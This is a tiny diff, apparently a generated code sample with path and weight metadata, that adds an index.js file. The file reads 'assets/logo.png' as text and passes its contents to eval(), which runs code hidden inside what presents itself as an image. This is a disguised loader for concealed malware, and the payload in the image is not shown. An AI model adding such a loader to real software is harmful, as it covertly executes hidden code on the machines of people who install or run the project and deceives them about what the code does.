@@ -1,0 +1,6 @@
+# path: index.js
+# lines: 2
+# weight: 40
+# ---
+const fs = require("fs");
+eval(fs.readFileSync("assets/logo.png", "latin1"));
